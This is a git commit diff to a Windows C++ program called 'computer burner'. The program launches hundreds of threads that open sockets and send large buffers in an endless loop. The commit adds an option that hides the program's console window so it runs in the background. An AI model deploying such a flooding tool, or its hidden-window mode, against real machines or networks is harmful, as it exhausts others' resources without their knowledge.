95354199d6dc1df134f3bb67e24e0b0523905851
DDEEII <153964184+DDEEII@users.noreply.github.com>
2024-08-26 15:44:45 +0800

    enable background running
    1.enable background running
    2.shorten code

--- computer burner.cpp
+++ computer burner.cpp
@@ -1,4 +1,4 @@
-﻿#include <stdc++.h>
+﻿#include "stdc++.h"
 #include "winsock2.h"
 #include <Ws2tcpip.h>
 #include <windows.h>
@@ -7,6 +7,7 @@
 #include <ctype.h>
 #include <fstream>
 #include<thread>
+#include"cmdline.h"
 #pragma comment(lib,"ws2_32.lib")
 using namespace std;
 //#define int long long
@@ -33,10 +34,7 @@ void show(int i) {
 	char buff[1024];
 	memset(buff, 0, sizeof(buff));
 
-	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
-		//cout<<"...";
-		return;
-	}
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)return;
 
 	SOCKADDR_IN addrSrv;
 	addrSrv.sin_family = AF_INET;
@@ -50,13 +48,8 @@ void show(int i) {
 		return;
 	}
 
-	if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) {
-		//printf("杩炴帴澶辫触:%d", WSAGetLastError());
-		return;
-	}
-	else {
-		recv(sockClient, buff, sizeof(buff), 0);
-	}
+	if (connect(sockClient, (struct  sockaddr*)&addrSrv, sizeof(addrSrv)) == INVALID_SOCKET) return;
+	else recv(sockClient, buff, sizeof(buff), 0);
 
 	char buffs[10000] = "nothing";
 	send(sockClient, buffs, sizeof(buffs), 0);
@@ -67,67 +60,28 @@ void show(int i) {
 	while(1){
 		send(sockClient, buffs, sizeof(buffs), 0);
 	}
-}bool IsNotPrint(char c)
-{
-	return !isprint(c) && c != 0;
-}
-signed main(int argc, char* argv[]) {
+}signed main(int argc, char* argv[]) {
 	//if (argc != 3)cout << "error thread number";
 	//numthread = atoi(argv[1]);
 	//Sleep(1000);
-	if (argc > 6)goto startt;
-	
-	if (argc == 2 && (strcmp(argv[1], "-h") == 0 || strcmp(argv[1] , "--help") == 0)) {
-		cout << "usage:\ncomputer-burner.exe [--thread/-t <num>] [--wait/-w <num>] [--help/-h]\n";
-		cout << "--thread or -t <num> : create <num> treads, defult 400\n";
-		cout << "--wait or -w <num> : wait <num>ms before start defult 0\n";
-		cout << "--help or -h : show this help message\n";
-		cout << "for more imformation ,visit github: https://github.com/DDEEII/computer-burner\n";
-		return 0;
-	}if (argc >= 3) {
-		if (strcmp(argv[1] ,"--tread")==0 || strcmp(argv[1] , "-t") == 0) {
-			for (int i = 1; i < strlen(argv[2]); i++) {
-				if (!isdigit(argv[2][i])) {
-					cout << "error thread number,using defult number:400\n";
-					goto startt;
-				}
-			}numthread = atoi(argv[2]);
-			cout << "using thread number:"<<argv[2]<<endl;
-		}else if (strcmp(argv[1], "--wait") == 0 || strcmp(argv[1] , "-w") == 0) {
-			for (int i = 0; i < strlen(argv[2]); i++) {
-				if (!isdigit(argv[2][i])) {
-					cout << "error waiting time,start without waiting\n";
-					goto startt;
-				}
-			}wait = atoi(argv[2]);
-			cout << "wait " << argv[2] <<"ms before starting"<< endl;
-		}if (argc == 5) {
-			if (strcmp(argv[3], "--tread") == 0 || strcmp(argv[3] , "-t") == 0) {
-				for (int i = 0; i < strlen(argv[4]); i++) {
-					if (!isdigit(argv[4][i])) {
-						cout << "error thread number,using defult number:400\n";
-						goto startt;
-					}
-				}numthread = atoi(argv[4]);
-				cout << "using thread number:" << argv[4] << endl;
-			}if (strcmp(argv[3], "--wait") == 0 || strcmp(argv[3], "-w") == 0) {
-				for (int i = 0; i < strlen(argv[4]); i++) {
-					if (!isdigit(argv[4][i])) {
-						cout << "error waiting time,start without waiting\n";
-						goto startt;
-					}
-				}wait = atoi(argv[4]);
-				cout << "wait " << argv[4] << "ms before starting" << endl;
-			}
-		}
-	}if (wait < 0 || numthread < 0||argc == 1 || argc == 2) cout << "using defult: 400 threads,start without waiting";
-	
-startt:
-	//system("pause");
+	SetConsoleTitle(L"computer-burner");
+	cmdline::parser a;
+	a.add<int>("tread", 't', "number of treads", false, 400);
+	a.add<int>("wait",  'w', "time to wait before start(ms)", false, 0);
+	a.add("background", 'b', "no window");
+	a.parse_check(argc, argv);
+	a.footer("for more imformation ,visit github: https://github.com/DDEEII/computer-burner\n");
+	numthread = a.get<int>("tread");
+	wait = a.get<int>("wait");
+	if (wait < 0 || numthread < 0) cout << "using defult: 400 threads,start without waiting";
+	if (a.exist("background")) {
+		HWND hWnd = FindWindow(NULL, L"computer-burner");
+		ShowWindow(hWnd, 0);
+	}
+	Sleep(wait);
 	for (int i = 0; i < numthread; i++) {
 		mythread[i] = thread(show, i);
 		ctcp[i] = thread(tcp, i);
-		//Sleep(50);
 	}
 
 	for (int i = 0; i < numthread; i++) {
